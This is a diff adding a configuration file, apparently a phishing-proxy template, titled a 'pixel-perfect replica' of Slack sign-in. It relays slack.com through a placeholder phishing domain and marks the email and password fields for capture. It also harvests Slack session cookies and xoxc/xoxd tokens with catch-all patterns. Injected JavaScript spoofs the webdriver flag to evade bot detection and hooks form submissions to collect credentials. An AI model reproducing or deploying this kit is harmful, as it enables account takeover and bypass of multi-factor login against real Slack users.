@@ -1,0 +1,63 @@
+name: Slack
+author: PhantomGate
+version: 2.0.0
+description: Slack authentication - Pixel-perfect replica
+
+auth:
+  domains:
+    - slack.com
+    - app.slack.com
+    - api.slack.com
+  
+  login:
+    domain: slack.com
+    path: /signin
+    username:
+      selector: "input#email"
+      capture: true
+    password:
+      selector: "input#password"
+      capture: true
+  
+  tokens:
+    cookies:
+      - name: d
+        regex: ".*"
+      - name: d-s
+        regex: ".*"
+      - name: xoxc-token
+        regex: ".*"
+      - name: xoxd-token
+        regex: ".*"
+
+proxy:
+  hosts:
+    - domain: slack.com
+      inject: true
+    - domain: app.slack.com
+      inject: true
+  
+  sub_filters:
+    - domain: slack.com
+      search: "https://slack.com"
+      replace: "https://{phishing_domain}"
+
+injection:
+  js: |
+    // PhantomGate Injection - Slack
+    (function() {
+      'use strict';
+      
+      // Override navigator properties
+      Object.defineProperty(navigator, 'webdriver', {get: () => false});
+      
+      // Capture form submissions
+      document.addEventListener('submit', function(e) {
+        var form = e.target;
+        var username = form.querySelector('#email');
+        var password = form.querySelector('#password');
+        if (username && password) {
+          console.log('[PhantomGate] Slack credentials captured');
+        }
+      }, true);
+    })();
